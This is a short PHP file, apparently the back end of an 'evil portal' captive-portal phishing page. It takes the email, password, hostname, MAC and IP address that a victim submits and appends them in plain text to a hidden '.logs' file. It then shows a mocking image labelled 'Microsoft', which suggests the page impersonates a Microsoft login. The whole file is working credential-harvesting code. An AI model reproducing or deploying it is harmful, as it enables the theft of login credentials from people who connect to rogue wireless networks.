<?php namespace evilportal;

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

class MyPortal
{
    public function handleAuthorization()
    {
        // echo "<pre>POST Data:\n";
        //print_r($_POST);
        //echo "</pre>";

        $email = $_POST['email'] ?? 'Unknown';
        $password = $_POST['password'] ?? 'Unknown';
        $hostname = $_POST['hostname'] ?? 'Unknown';
        $mac = $_POST['mac'] ?? 'Unknown';
        $ip = $_POST['ip'] ?? 'Unknown';

        $logPath = __DIR__ . '/.logs';
        $logContent = "Timestamp: " . date('Y-m-d H:i:s') . "\nEmail: $email\nPassword: $password\nHostname: $hostname\nMAC: $mac\nIP: $ip\n\n";
        file_put_contents($logPath, $logContent, FILE_APPEND);

        // echo "Log content written:\n$logContent";
        echo '<img src="assets/lol.gif" alt="Microsoft" width=100%/>';
    }
}

$portal = new MyPortal();
$portal->handleAuthorization();
